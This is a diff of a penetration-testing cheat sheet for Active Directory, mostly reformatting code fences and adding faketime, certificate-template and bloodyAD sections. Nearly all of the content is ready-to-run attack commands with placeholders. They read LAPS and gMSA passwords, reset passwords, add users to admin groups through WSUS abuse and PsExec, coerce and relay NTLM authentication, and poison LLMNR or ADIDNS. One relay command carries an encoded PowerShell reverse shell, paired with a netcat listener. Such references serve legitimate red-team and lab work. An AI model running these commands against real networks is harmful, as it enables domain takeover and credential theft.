@@ -818,19 +818,19 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 
 ###### Setup Proxy on Attacker Machine
 
-```console
+```shell
 sudo ./proxy -selfcert
 ```
 
 ###### Prepare Tunnel Interface
 
-```console
+```shell
 ligolo-ng » ifcreate --name ligolo
 ```
 
 ###### Add Route to Tunnel Interface
 
-```console
+```shell
 ligolo-ng » route_add --name ligolo --route <SUBNET>
 ```
 
@@ -1434,6 +1434,13 @@ sudo ntpdate -b -u <RHOST>
 ```shell
 sudo rdate -n <RHOST>
 sudo rdate -s <RHOST>
+```
+
+##### faketime
+
+```shell
+faketime "$(ntpdate -q <DOMAIN> | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" <COMMAND>
+faketime "$(ntpdate -q <DOMAIN> | grep -oP '^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" <COMMAND> -timeout 60
 ```
 
 ##### timedatectl
@@ -3763,7 +3770,7 @@ netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
 
 ###### Forest Trust Enumeration
 
-```console
+```shell
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
 ```
@@ -3772,7 +3779,7 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(obj
 python3 -c 'v=72; print(f"{v} = {v:#x}"); print([name for bit,name in [(0x1,"NON_TRANSITIVE"),(0x2,"UPLEVEL_ONLY"),(0x4,"QUARANTINED"),(0x8,"FOREST_TRANSITIVE"),(0x10,"CROSS_ORGANIZATION"),(0x20,"WITHIN_FOREST"),(0x40,"TREAT_AS_EXTERNAL"),(0x400,"PIM_TRUST")] if v & bit])'
 ```
 
-```console
+```shell
 netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=group)(objectSid=*))' 'sAMAccountName objectSid memberOf'
 ```
 
@@ -5369,35 +5376,58 @@ openssl pkcs12 -in <FILE>.pfx -out <FILE>.pem -nodes --passin pass:
 ```
 
 ```shell
-bloodyAD -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --host <HOSTNAME> --dc-ip <RHOST> add dnsRecord <RHOST> <LHOST>
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RHOST> <LHOST>
 ```
 
 ```shell
-bloodyAD -d <DOMAIN> -u '<USERNAME>' -p '<PASSWORD>' --host <RHOST> --dc-ip <RHOST> get dnsDump | grep <RHOST>
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump | grep <RHOST>
 ```
 
 ```shell
 nslookup <RHOST> <RHOST>
 ```
 
-```console
+```shell
 python3 pywsus.py -H <RHOST> -p 8531 -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' --cert <FILE>.crt --key <FILE>.key
 ```
 
 or
 
-```console
+```shell
 sudo wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> -t <RHOST> --WSUS-Server <RHOST> --tls-cert <FILE>.pem
 ```
 
 or
 
-```console
+```shell
 sudo wsuks --serve-only --tls-cert <FILE>.pem -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' -I <INTERFACE>
 ```
 
 ```shell
 nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
+```
+
+##### Template Creation Abuse through dangerous CA Permissions
+
+###### Enumeration
+
+```shell
+bloodyad --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -i certificateTemplates
+bloodyad --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -A 20 "certificateTemplates"
+```
+
+###### Create Certificate Template
+
+```shell
+msfconsole -q
+msf > use auxiliary/admin/ldap/ad_cs_cert_template
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOST <RHOST>
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME <USERNAME>
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD '<PASSWORD>'
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set DOMAIN <DOMAIN>
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE <TEMPLATE>
+msf auxiliary(admin/ldap/ad_cs_cert_template) > set Action CREATE
+msf auxiliary(admin/ldap/ad_cs_cert_template) > run
 ```
 
 ##### Error Handling
@@ -5536,39 +5566,58 @@ bloodhound-python -u <USERNAME>@<DOMAIN> -k -no-pass -d <DOMAIN> -dc <RHOST> -ns
 
 > https://github.com/CravateRouge/bloodyAD/wiki/Access-Control
 
+### Get
+
 ```shell
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get bloodhound                                                         // Get BloodHound dump
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                       // Get all users of the domain
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                   // Get all computers of the domain
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                  // Get all containers of the domain
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                              // Get AD DNS records
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                           // Get group members
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get writable --detail                                                    // Get object permissions
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version        // Get AD functional level
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                 // Get minimum password length policy
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota    // Read quota for adding computer objects to domain
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                        // Get UserAccountControl flags
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                         // Read LAPS password
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> --kerberos -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'        // Set a password for a user
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get bloodhound                                                                                                    // Get BloodHound dump
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                                                                  // Get all users of the domain
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                                                              // Get all computers of the domain
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                                                             // Get all containers of the domain
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                                                                         // Get AD DNS records
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                                                                      // Get group members
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get writable --detail                                                                                               // Get object permissions
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version                                                   // Get AD functional level
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                                                            // Get minimum password length policy
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota                                               // Read quota for adding computer objects to domain
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                                                                   // Get UserAccountControl flags
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -i certificateTemplates         // Get published certificate templates
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -A 20 "certificateTemplates"    // Get published certificate templates
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                                                                    // Read LAPS password
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                                                             // Read GMSA account password
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                                                                      // Read GMSA account password using Kerberos
+```
+
+### Set
+
+```shell
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> --kerberos -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                                 // Set a password for a user
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                                                      // Set a Service Principal Name (SPN)
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                                               // Set a Service Principal Name (SPN) using Kerberos
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                                          // Set a Service Principal Name (SPN) using Kerberos
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>'    // Set a email address within a certificate
 bloodyAD --host <RHOST> -u <USERNAME> -p '<PASSWORD>' set object "CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" scriptPath -v <FILE>.bat                        // Set scriptPath for a user mapping to a script within scripts on SYSVOL
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION                   // Enable machine account for as trusted for delegation
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                   // Add user to a group
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                            // Add user to a group using Kerberos
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'                   // Add a computer object on behalf of a user
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                    // Enable DONT_REQ_PREAUTH for ASREPRoast
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                          // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
+```
+
+### Add
+
+```shell
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION                                                      // Enable machine account for as trusted for delegation
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                                                      // Add user to a group
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                                                               // Add user to a group using Kerberos
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'                                                      // Add a computer object on behalf of a user
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                                                              // Add a new DNS entry
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                                                       // Enable DONT_REQ_PREAUTH for ASREPRoast
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                                                             // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
 bloodyAD --host <RHOST> -i <RHOST> -d <DOMAIN> -u <USERNAME> -k ccache=<FILE>.ccache kdc=<RHOST> add user <USERNAME> '<PASSWORD>' --ou 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>'    // Add user to a specific OU
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'                               // Add genericAll permissions to a specific OU
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE                                   // Disable ACCOUNTDISABLE (enable account)
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE                                         // Disable ACCOUNTDISABLE (enable account) using Kerberos
+```
+
+### Remove
+
+```shell
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>         // Remove a DNS entry
+bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE    // Disable ACCOUNTDISABLE (enable account)
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE          // Disable ACCOUNTDISABLE (enable account) using Kerberos
 ```
 
 #### Certify
@@ -5757,7 +5806,7 @@ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /P
 
 ###### Common Commands
 
-```console
+```shell
 impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --interactive
 impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access
 impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --remove-mic -i
@@ -5772,19 +5821,19 @@ impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --no-dump --no-da --no-acl
 
 ###### Execution
 
-```console
+```shell
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>
 ```
 
 or
 
-```console
+```shell
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST> METHOD=petitpotam
 ```
 
 ###### Connect to LDAP Shell
 
-```console
+```shell
 nc 127.0.0.1 11000
 ```
 
@@ -5792,28 +5841,28 @@ nc 127.0.0.1 11000
 
 ###### Resource-Based Constrained Delegtion (RBCD)
 
-```console
+```shell
 set_rbcd <RHOST>$ <RHOST>$
 ```
 
-```console
+```shell
 impacket-getST -spn 'cifs/<RHOST>.<DOMAIN>' -impersonate Administrator -hashes
 ```
 
-```console
+```shell
 netexec smb <RHOST>.<DOMAIN> -u '<RHOST>$' -H <HASH> --delegate Administrator --self
 ```
 
 ###### Shadow Credentials
 
-```console
+```shell
 clear_shadow_creds <RHOST>$
 set_shadow_creds <RHOST>$
 ```
 
 ###### Reverse Shell Example
 
-```console
+```shell
 impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JAB<--- SNIP --->j=="
 ```
 
@@ -5821,7 +5870,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc
 dir \\<LHOST>\foobar
 ```
 
-```console
+```shell
 nc -lnvp <LPORT>
 ```
 
@@ -7499,7 +7548,7 @@ python3 -c 'import hashlib; print(hashlib.new("md4","P@ssw0rd123".encode("utf-16
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0
 sudo responder -I eth0 -A
 sudo responder -I eth0 -W
@@ -7507,7 +7556,7 @@ sudo responder -I eth0 -W
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python ntlmrelayx.py -6 -smb2support -t <RHOST>
 ```
@@ -7516,14 +7565,14 @@ python ntlmrelayx.py -6 -smb2support -t <RHOST>
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 mitm6 -d <DOMAIN> -hb <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 mitm6 -d <DOMAIN> -hb <LHOST>
 python ntlmrelayx.py -6 -smb2support -t <RHOST>
 ```
@@ -7532,28 +7581,28 @@ python ntlmrelayx.py -6 -smb2support -t <RHOST>
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 python PetitPotam.py <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 sudo responder -I eth0 -A
 netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python PetitPotam.py <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
 ```
@@ -7564,28 +7613,28 @@ netexec smb <RHOST> -M coerce_plus -M Petitpotam -L <LHOST>
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 sudo responder -I eth0 -A
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -L <LHOST>
 ```
@@ -7594,28 +7643,28 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Petitpotam -
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 sudo responder -I eth0 -A
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L <LHOST>
 ```
@@ -7624,27 +7673,27 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M DFSCoerce -L
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 python shadowcoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 or
 
-```console
+```shell
 sudo responder -I eth0 -A
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python shadowcoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' <LHOST> <RHOST>
 ```
 
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce -L <LHOST>
 ```
@@ -7653,28 +7702,28 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M ShadowCoerce
 
 ###### Capture
 
-```console
+```shell
 responder -I eth0 -A
 python printerbug.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
 ```
 
 or
 
-```console
+```shell
 responder -I eth0 -A
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python printerbug.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
 ```
 
 or
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -L <LHOST>
 ```
@@ -7683,28 +7732,28 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M Printerbug -
 
 ###### Capture
 
-```console
+```shell
 sudo responder -I eth0 -A
 python cheese.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
 ```
 
 or
 
-```console
+```shell
 sudo responder -I eth0 -A
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <LHOST>
 ```
 
 ###### Relay
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 python cheese.py '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>' <LHOST>
 ```
 
 or
 
-```console
+```shell
 python ntlmrelayx.py -smb2support -t <RHOST>
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <LHOST>
 ```
@@ -7715,13 +7764,13 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M coerce_plus -M MSEven -L <L
 
 ###### Check for WebClient Service
 
-```console
+```shell
 webclientservicescanner '<DOMAIN>/<USERNAME>':'<PASSWORD>'@'<RHOST>'
 ```
 
 or
 
-```console
+```shell
 netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M webdav
 ```
 
@@ -7729,13 +7778,13 @@ netexec smb <RHOST> -u <USERNAME> -p '<PASSWORD>' -M webdav
 
 ###### LLMNR/mDNS/NBNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -w
 ```
 
 ###### ADIDNS Poisoning
 
-```console
+```shell
 python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
 ```
 
@@ -7745,14 +7794,14 @@ python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' 
 
 ###### LLMNR/mDNS/NBNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -w
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
 ```
 
 ###### ADIDNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -A
 python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
@@ -7762,7 +7811,7 @@ python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAA
 
 ###### LLMNR/mDNS/NBNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -w
 python ntlmrelayx.py --no-smb-server -t <RHOST>
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
@@ -7770,7 +7819,7 @@ python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAA
 
 ###### ADIDNS Poisoning
 
-```console
+```shell
 python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
 python ntlmrelayx.py -t <RHOST> --no-smb-server
 python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAt@80/foobar' <RHOST>
@@ -7782,14 +7831,14 @@ python PetitPotam.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAA
 
 ###### LLMNR/mDNS/NBNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -w
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
 ```
 
 ###### ADIDNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -A
 python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
@@ -7799,7 +7848,7 @@ python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAA
 
 ###### LLMNR/mDNS/NBNS Poisoning
 
-```console
+```shell
 sudo responder -I eth0 -w
 python ntlmrelayx.py --no-smb-server -t <RHOST>
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'bogus@80/foobar' <RHOST>
@@ -7807,7 +7856,7 @@ python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'bogus@80/foobar' 
 
 ###### ADIDNS Poisoning
 
-```console
+```shell
 python dnstool.py -u '<DOMAIN>\<USERNAME>' -p '<PASSWORD>' -a add -r '<DOMAIN>' -d <LHOST> <RHOST>
 python ntlmrelayx.py -t <RHOST> --no-smb-server
 python dfscoerce.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' 'UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA@80/foobar' <RHOST>
@@ -8258,15 +8307,15 @@ pth-net rpc password '<USERNAME>' '<PASSWORD>' -U '<DOMAIN>'/'<USERNAME>'%'<HASH
 
 or
